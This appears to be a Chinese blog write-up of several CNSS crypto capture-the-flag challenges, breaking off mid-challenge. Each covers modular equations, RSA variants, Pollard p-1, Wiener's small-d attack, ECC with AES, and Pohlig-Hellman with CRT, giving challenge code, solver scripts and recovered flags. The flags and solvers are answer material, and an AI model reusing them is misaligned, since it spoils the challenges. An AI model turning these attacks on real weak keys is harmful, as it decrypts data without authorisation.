<h2 id="🐬-水龙吟"><a href="#🐬-水龙吟" class="headerlink" title="🐬 水龙吟"></a>🐬 水龙吟</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from Crypto.Util.number import *</span></span><br><span class="line"><span class="string">from secret import flag</span></span><br><span class="line"><span class="string">m = bytes_to_long(flag)</span></span><br><span class="line"><span class="string">p = 4873905926740615531018463661385452170898784133203367799135441645830937750628221985822405430005703937197770247575076559744236744538228018031486049820173674</span></span><br><span class="line"><span class="string">g = 2593552830271406523114019117101950399687742243315195843514987700785182656087120211241524521448500935829478648514527037446437576680778419567396094750508622</span></span><br><span class="line"><span class="string">c = 0</span></span><br><span class="line"><span class="string">for i in range(m):</span></span><br><span class="line"><span class="string">    c = (c + g) % p</span></span><br><span class="line"><span class="string">print(f&#x27;&#123;c = &#125;&#x27;)</span></span><br><span class="line"><span class="string">c = 3431276814099066030808269572939347769420622699894452016972504433264414095698239241816562301198442206498226641308404105790355301176892588988847042699636406</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exgcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x, y, q = exgcd(b, a % b)</span><br><span class="line">    x, y = y, (x - a // b * y)</span><br><span class="line">    <span class="keyword">return</span> x, y, q</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LiEu</span>(<span class="params">a, b, m</span>):</span><br><span class="line">    <span class="comment"># ax = b % m</span></span><br><span class="line">    x, y, q = exgcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> b % q == <span class="number">0</span>:</span><br><span class="line">        m = m//q</span><br><span class="line">        <span class="keyword">return</span> ((x*b//q + m) % m)</span><br><span class="line">p = </span><br><span class="line">g = </span><br><span class="line">c = </span><br><span class="line">flag = LiEu(g, c, p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>
<p>$ax\equiv b\ (mod\ m)$<br>$等价，ax+my=b$<br>$ax’+my’=gcd(a,m)=d$<br>$a/d是整数，m/d也是整数，所以，d|b$<br>$(a/d)<em>x+(m/d)</em>y=b/d，随着y值变化，x存在d个不同余的解，d个解关于m/d同余$<br>$ax’<em>(b/d)+my’</em>(b/d)=d<em>(b/d)=b$<br>$可以看到x’</em>(b/d)是方程的解，但它可能是负数，加个数即可$<br>$最终，最小整数解为(在这里m=m/d)，(x*(b/d)+m)\%m$</p>
<p><code>cnss&#123;Subgroup @nd Eucl1d algOrithm 1s eleg4nt.&#125;</code><br>考点<code>同余方程求解</code></p>
<h2 id="🌔-卜算子"><a href="#🌔-卜算子" class="headerlink" title="🌔 卜算子"></a>🌔 卜算子</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from Crypto.Util.number import *</span></span><br><span class="line"><span class="string">from secret import flag</span></span><br><span class="line"><span class="string">p, q, r = getPrime(512), getPrime(512), getPrime(512)</span></span><br><span class="line"><span class="string">n = p * q * r</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">m = bytes_to_long(flag)</span></span><br><span class="line"><span class="string">c = pow(m, e, n)</span></span><br><span class="line"><span class="string">print(&#x27;p =&#x27;, p)</span></span><br><span class="line"><span class="string">print(&#x27;q =&#x27;, q)</span></span><br><span class="line"><span class="string">print(&#x27;n =&#x27;, n)</span></span><br><span class="line"><span class="string">print(&#x27;c =&#x27;, c)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 12253096079262730693787845304459770181159272160708761390419517461435886798119494973936186382645490774511179747402693066192362104144553287739427091488849987</span></span><br><span class="line"><span class="string">q = 9656184899794050073098614505490788837141112476549205418072011388278372195682566976277132351856116300104728124405389485440262266612903835574949734938773879</span></span><br><span class="line"><span class="string">n = 1068394811940475700113916170772008310607904879176073274337669322446687936907143981238893756179197975634434673229920275765973807209412891205884402965483756254507691419368528133959132303476165747992107800736918701005971552264644185146124560027884795936191839406241406301141310602020436434278421529178345240902508007101551941438277539664839258109542374751444222500079818129540895166090788487787028178055561786822480872065405947357363186718845196587434430898650662917</span></span><br><span class="line"><span class="string">c = 364812620179131273680130240148084836403846027393384913159162092631491386521136431985815726041640268869899250546875572473450702105133851945618590296616284218872409897353796638895758963083075264218372930102765065661636950920355098372841435042642748593167374414989630427181232399218196685772309403529745406119979371226428026631723070867224675860939203796555567951762311063010081727524747799375832842589314306700599116049075415601108806973017635507910763925927172362</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">r = n//p//q</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>
<p><code>cnss&#123;1t is similar to two-prime RSA....&#125;</code><br>考点<code>最基本的RSA</code></p>
<h2 id="🐠-Fun-factoring"><a href="#🐠-Fun-factoring" class="headerlink" title="🐠 Fun_factoring"></a>🐠 Fun_factoring</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag1, flag2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    primes = []</span><br><span class="line">    p = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(primes) &lt; <span class="number">100</span>:</span><br><span class="line">        p = next_prime(p)</span><br><span class="line">        primes.append(<span class="built_in">int</span>(p))</span><br><span class="line">    <span class="keyword">return</span> primes</span><br><span class="line">primes = init()</span><br><span class="line">p1 = getPrime(<span class="number">256</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q1 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> q1.bit_length() &lt; <span class="number">255</span>:</span><br><span class="line">        q1 *= random.choice(primes)</span><br><span class="line">    q1 = q1 + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(q1):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">n1 = p1 * q1</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m1 = bytes_to_long(flag1)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c1 = &#125;</span>&#x27;</span>)</span><br><span class="line">m2 = bytes_to_long(flag2)</span><br><span class="line">p2 = getPrime(<span class="number">256</span>)</span><br><span class="line">q2 = getPrime(<span class="number">256</span>)</span><br><span class="line">n2 = p2 * q2</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, n2)</span><br><span class="line">phi = (p2 - <span class="number">1</span>) * (q2 - <span class="number">1</span>)</span><br><span class="line">e2 = getPrime(<span class="number">256</span>)</span><br><span class="line">d2 = inverse(e2, phi)</span><br><span class="line">hint1 = getPrime(<span class="number">256</span>) * n2</span><br><span class="line">hint2 = e2 * d2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;hint1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;hint2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n1 = 29993156790273796411588637755401407649619741972315831791586727944419911570896819043688187483218756247767784823799572993962152654560761989054087817767687901</span></span><br><span class="line"><span class="string">c1 = 28308885699728621592812918494757273712938007912315485487807230648420711341284570451708049371754826651903406663574768899937862287581243099737368091309807825</span></span><br><span class="line"><span class="string">c2 = 3677242432073556679040222440039877927024312077564452145956625214187804614184186227277646425370459616386984491952553180136037741092781602470053045143802537</span></span><br><span class="line"><span class="string">hint1 = 397340046977096077577115578026599912881304442662450049334426974861677656259439266980515145452369301652618056238525786266286451780972189318240092026572582216328286841448920434798083168400087303822060653407466964485682775061825982767</span></span><br><span class="line"><span class="string">hint2 = 42319976894927564843833810567252442522907372281560684051129782019144211533194692653447095916384084531450449319697685128778953472384491084162072476640254892049041007337641419872550411941455264025858397584349456909103991157799852081</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poolard_p_1</span>(<span class="params">N</span>):</span><br><span class="line">    a, n = <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = <span class="built_in">pow</span>(a, n, N)</span><br><span class="line">        res = GCD(a-<span class="number">1</span>, N)</span><br><span class="line">        <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">            q = N // res</span><br><span class="line">            <span class="keyword">return</span> res, q</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getpq</span>(<span class="params">n, ed</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = ed - <span class="number">1</span></span><br><span class="line">        g = random.randint(<span class="number">0</span>, n)</span><br><span class="line">        <span class="keyword">while</span> k % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            k = k//<span class="number">2</span></span><br><span class="line">            temp = <span class="built_in">pow</span>(g, k, n)-<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> GCD(temp, n) &gt; <span class="number">1</span> <span class="keyword">and</span> temp != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> GCD(temp, n), n//GCD(temp, n)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n1 = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">hint1 = </span><br><span class="line">hint2 = </span><br><span class="line"><span class="comment"># p, q = </span></span><br><span class="line">p, q = Poolard_p_1(n1)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">flag1 = long_to_bytes(<span class="built_in">pow</span>(c1, d, n1))</span><br><span class="line">n2, r = getpq(hint1, hint2)</span><br><span class="line">p, q = getpq(n2, hint2)</span><br><span class="line"><span class="built_in">print</span>(p*q == n2)</span><br><span class="line"><span class="built_in">print</span>(p*q == r)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">flag2 = long_to_bytes(<span class="built_in">pow</span>(c2, d, n2))</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br></pre></td></tr></table></figure>
<p><code>q1-1</code>是光滑数(可以分解为小素数乘积的正整数)，可以用<code>Pollard&#39;s p-1</code>算法分解<code>n1</code>，这里数比较小，也可以直接分</p>
<p><code>hint2 = e2 * d2</code>，想起了，知道<code>e*d,n</code>可以分解<code>n</code><br><img src="https://picx.zhimg.com/80/v2-54c76534bf4e9c1e82b0b1023c05daa8_1440w.png" alt=""><br>那么，同理，是否可以用<code>hint2</code>分解<code>hint1</code>呢？答案是可以的<br>为什么呢？原因很简单，我们满足条件<br>$g^{ed-1}\equiv 1(mod\ hint1)$<br>即可<br>根据欧拉定理<br>$g^{\phi (n_{2})*(r-1)}\equiv 1(mod\ hint1)$<br>$而，ed-1=k\phi(n_{2})，测试可知，k&gt;&gt;r-1$<br>所以也可以满足</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">b<span class="string">&#x27;cnss&#123;1f_y0u_Kn0w_Pollard_y0u_Kn0w_1t_4ll&#125;&#x27;</span></span><br><span class="line">b<span class="string">&#x27;cnss&#123;Factoring_the_modulus_1s_FUn_fuN_Fun_f0r_The_whOLe_F4miLY!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>考点<code>Pollard&#39;s p-1算法，通过e*d分解n</code></p>
<h2 id="🦢-BabyCurve"><a href="#🦢-BabyCurve" class="headerlink" title="🦢 BabyCurve"></a>🦢 BabyCurve</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    enc = cipher.encrypt(pad(data, AES.block_size))</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line">p = <span class="number">9348030992978262347982920431034912130716881552084115381757548130699185130820479730646974634141092089651314678852571714802122984104452942803209295252010181</span></span><br><span class="line">a = <span class="number">7763518046982192251231517150944105482004832971680748456996310159078009542876654956303764776823623497403884988108392624824526960061132573798331838835960909</span></span><br><span class="line">b = <span class="number">10997613169313236085705837600762108982163011398922795151006166411501358991822489779966644769325114384948484844491824976044124478063235526767931678399125511</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    key = urandom(<span class="number">16</span>)</span><br><span class="line">    x = ZZ(bytes_to_long(key))</span><br><span class="line">    <span class="keyword">if</span> E.is_x_coord(x):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">enc = encrypt(flag, key)</span><br><span class="line">P = E.lift_x(x)</span><br><span class="line">Q = e * P</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Q = <span class="subst">&#123;(Q[<span class="number">0</span>], Q[<span class="number">1</span>])&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;enc = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Q = (702269728158503157149596097443623465665001736303612719716566418594125500303838352102906729735173073066319779069987350585597471722439620961396365725087358, 7741251535874845030195254089473397439416170375681731646623904995909698213716045714883145323049811857989495704699439881764120694648581710750825272993480662)</span></span><br><span class="line"><span class="string">enc = b&#x27;c\xea\x0eO\xf1V\n&quot;\xf4\xd5V\x10\x06\x85\xd8a\xe5`\xab\xd4\x9b\x96Fz+:\x0b\xaeg-\x92\xe6\xfb:\xc7\xaf\x1b&lt;\x04\xf0\x81\xb8\xbf\xc6\x96\x16q\x17\xd0\xb4F\x92L]\xa4\xe9|\xe1\xafg?\x1c\x88u&#123;\x91\xe5=\x0c\xdb\xb6S\x02\xdd4\x90F.\xe8\xa9&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = </span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">Q = </span><br><span class="line">Q=E.point(Q)</span><br><span class="line">d=inverse(e,E.order())</span><br><span class="line">P=d*Q</span><br><span class="line">x=P[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    dec = cipher.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> dec</span><br><span class="line">enc = <span class="string">b&#x27;c\xea\x0eO\xf1V\n&quot;\xf4\xd5V\x10\x06\x85\xd8a\xe5`\xab\xd4\x9b\x96Fz+:\x0b\xaeg-\x92\xe6\xfb:\xc7\xaf\x1b&lt;\x04\xf0\x81\xb8\xbf\xc6\x96\x16q\x17\xd0\xb4F\x92L]\xa4\xe9|\xe1\xafg?\x1c\x88u&#123;\x91\xe5=\x0c\xdb\xb6S\x02\xdd4\x90F.\xe8\xa9&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(decrypt(enc, long_to_bytes(<span class="built_in">int</span>(x))))</span><br></pre></td></tr></table></figure>
<p><code>Q = e * P</code>，给定公私钥计算基点，<code>P = Q*inverse(e,E.order())</code><br><code>cnss&#123;The elliptic curve 0ver a fin1te f1eld is an ab3lian group!&#125;</code></p>
<p>考点<code>ECC的简单解密，已知公私钥求基点+AES</code></p>
<h2 id="🔑-Small-private-key"><a href="#🔑-Small-private-key" class="headerlink" title="🔑 Small private key"></a>🔑 Small private key</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p**<span class="number">2</span> * q</span><br><span class="line">beta = <span class="number">0.17</span></span><br><span class="line">d = getPrime(<span class="built_in">int</span>(n.bit_length() * beta))</span><br><span class="line">phi = p * (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = inverse(d, phi)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e = 99229505005010231229812309405118621210000665411317929329600320339351298536042106221904006618372016899838834315350282056201576780947332634472383794182914396787560149770087768346108970874622698958641239168672884943722683097496196568051260666405536471900271607250500649553508481028777575476228205350216263899864839231023168979708315202587104442940310612179957452668838181940302165426024768292895768359058100485442771122055233699699591861456009579197208612724634653</span></span><br><span class="line"><span class="string">n = 777932066471261253953635643543769273870576807001853821365002899038017652136640326606707541086305255419688451331308105858262381681205657118149670724969402173491693110671887550886032285747295962582655746980079520315019448934437742771629769039207570002600238133829941166519652324878087610266956030449933384381670213413005273221487049001640280300893616812980727738757188984406451974046745624206457936867759992076616467784551949417643382015447862723484003189099322113</span></span><br><span class="line"><span class="string">c = 315162533057119030644069576898014821746187831990641977888442441986396488578480924344830827691640071104116111429579458497274291449212879753454215527936892759921631840278976085540574066181311866181244489267112630519512826615435097016920565522260797348024774745088674028891909401404506165402416608686728774514537539009768594970540227164117320018763121106885108998344223691343126585144804733329828035450075042672319188914135360404008915353519214959250876459809490891</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContinuedFraction</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, numerator, denumerator</span>):</span><br><span class="line">        self.numberlist = []</span><br><span class="line">        self.fractionlist = []</span><br><span class="line">        self.GenerateNumberList(numerator, denumerator)</span><br><span class="line">        self.GenerateFractionList()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GenerateNumberList</span>(<span class="params">self, numerator, denumerator</span>):</span><br><span class="line">        <span class="keyword">while</span> numerator != <span class="number">1</span>:</span><br><span class="line">            quotient = numerator//denumerator</span><br><span class="line">            remainder = numerator % denumerator</span><br><span class="line">            self.numberlist.append(quotient)</span><br><span class="line">            numerator = denumerator</span><br><span class="line">            denumerator = remainder</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GenerateFractionList</span>(<span class="params">self</span>):</span><br><span class="line">        self.fractionlist.append([self.numberlist[<span class="number">0</span>], <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(self.numberlist)):</span><br><span class="line">            numerator = self.numberlist[i]</span><br><span class="line">            denumerator = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                temp = numerator</span><br><span class="line">                numerator = denumerator+numerator*self.numberlist[i-j-<span class="number">1</span>]</span><br><span class="line">                denumerator = temp</span><br><span class="line">            self.fractionlist.append([numerator, denumerator])</span><br><span class="line">n_3 = gmpy2.iroot(n, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">near = n-(<span class="number">2</span>*<span class="built_in">pow</span>(n_3, <span class="number">2</span>)-n_3)</span><br><span class="line">a = ContinuedFraction(e, near)</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> k, d <span class="keyword">in</span> a.fractionlist:</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">    result.append(phi)</span><br><span class="line"><span class="keyword">for</span> phi <span class="keyword">in</span> result:</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;cnss&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><code>d</code>很小，<code>winner attack</code>，根据<code>n=p**2*q</code>，找到一篇参考<br><a target="_blank" rel="noopener" href="https://iopscience.iop.org/article/10.1088/1742-6596/622/1/012019/pdf">https://iopscience.iop.org/article/10.1088/1742-6596/622/1/012019/pdf</a><br>$\phi(n)\approx n-(2*n^{2/3}-n^{1/3})$<br><code>cnss&#123;Th1s is the p0wer of continu3d fr@ction hhhhhhh&#125;</code></p>
<p>考点<code>winner attack</code></p>
<h2 id="🐿️-物不知数"><a href="#🐿️-物不知数" class="headerlink" title="🐿️ 物不知数"></a>🐿️ 物不知数</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> prod</span><br><span class="line"><span class="keyword">from</span> Secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">256</span></span><br><span class="line">factors = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    factors.append(getPrime(<span class="number">64</span>))</span><br><span class="line">factors.append(getPrime(<span class="number">256</span>))</span><br><span class="line">n = prod(factors)</span><br><span class="line">g = <span class="number">7</span></span><br><span class="line">h = <span class="built_in">pow</span>(g, m, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h =&#x27;</span>, h)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 3322653117860796307881702118715938603299933196422318170688239817538863269879196751517883984368101175912757699818959313188577820238991745748791220070657861</span></span><br><span class="line"><span class="string">h = 2124833808496595853801133466156124859021541288125712571058299295082272671181015365259674266573518307514981326822864098542354452199064749348011358863682094</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">h = </span><br><span class="line">g = <span class="number">7</span></span><br><span class="line">factors = [<span class="number">12147669238962073417</span>, <span class="number">14971597303591082789</span>,</span><br><span class="line">           <span class="number">15677874518002551319</span>, <span class="number">16244778999786121217</span>]</span><br><span class="line">m_list = []</span><br><span class="line">n_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> factors:</span><br><span class="line">    R = GF(i)</span><br><span class="line">    <span class="comment"># m_list.append(discrete_log(R(h),R(g)))</span></span><br><span class="line">    m_list.append(R(h).log(R(g)))</span><br><span class="line">    n_list.append(i-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(crt(m_list, n_list)))</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.ruanx.net/pohlig-hellman/">https://www.ruanx.net/pohlig-hellman/</a><br><a target="_blank" rel="noopener" href="https://blog.miskcoo.com/2015/05/discrete-logarithm-problem">https://blog.miskcoo.com/2015/05/discrete-logarithm-problem</a><br>$h\equiv 7^{m}(mod\ n)，离散对数问题(DLP)$<br>$SageMath里面实现的离散对数就是基于大步小步算法(BSGS)和Pohlig-Hellman$<br>$有两种方法，但貌似第一个(注释掉的那个)太慢了$<br>$h=g^{m}(mod\ p)，两边取指标，Ind_{g}h=m\ mod\ \phi(p)$<br>$所以，实际上我们BAGS得到的m，是在模\phi(p)下的$<br>$M=m_{i}\ mod\ \phi (p_{i})$<br>$n的最后一个因子比较大，为减少运行时间，CRT依靠前四个因子也能求解$</p>
<p><code>cnss&#123;Wow!The CRT 1s S0 u5eful!&#125;</code><br>考点<code>DLP+CRT</code></p>
<h2 id="⚒️-铜匠的艺术Ⅱ"><a href="#⚒️-铜匠的艺术Ⅱ" class="headerlink" title="⚒️ 铜匠的艺术Ⅱ()"></a>⚒️ 铜匠的艺术Ⅱ()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">s = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">r1, r2 = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">b1, b2 = getPrime(<span class="number">246</span>), getPrime(<span class="number">246</span>)</span><br><span class="line">d1 = inverse(s+r1, p) - b1</span><br><span class="line">d2 = inverse(s+r2, p) - b2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;p = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;d1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;d2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;r1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;r2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 151530040749164553403967983518843577352864270263889106337011110378601036680690471836027157653547709937519393960972849334865341611877035904693178333416457975524708748243011699123245181968472855540946305680746439921799620880630731896672163604054069337581059081562076860588954007665828525502756791219539357191539</span></span><br><span class="line"><span class="string">d1 = 50083234780783999664902204148367665654965860210705806460611800714011984032825099659257301169981655933116226437075588050862473758014777833755744093767631735454786283542732504816602375269658543953884652005423131768292669188376398437788186070246006877324243974392923640712035990908502571083697320506587058057087</span></span><br><span class="line"><span class="string">d2 = 91453105340363659854895114107811465809020665893141480802534401849670186432558336798544994184391985650330332142766844489480723736690400200157100330182955996913526651749892519448150014139485635391932575239621990448927615793198397632259445575664911965643266433167901384050043834029621593534439503767913891826664</span></span><br><span class="line"><span class="string">r1 = 